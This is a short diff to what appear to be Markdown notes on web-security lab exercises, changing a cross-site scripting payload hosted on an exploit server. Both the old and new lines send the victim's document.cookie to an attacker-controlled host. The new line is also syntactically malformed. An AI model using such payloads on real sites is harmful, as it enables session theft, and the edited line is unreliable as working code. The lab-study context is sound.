@@ -660,7 +660,7 @@ HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
 
 <script>
-location = "https://ID.web-security-academy.net/?parameter=" + encodeURIComponent("<iframe src='https://exploit-ID.exploit-server.net/?cookies=" + document.cookie + "'>");
+location = "https://ID.web-security-academy.net/?parameter="location%3D%27https%3A%2F%2Fexploit-ID.exploit-server.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B;
 </script>
 ```
 ### Database Enumeration
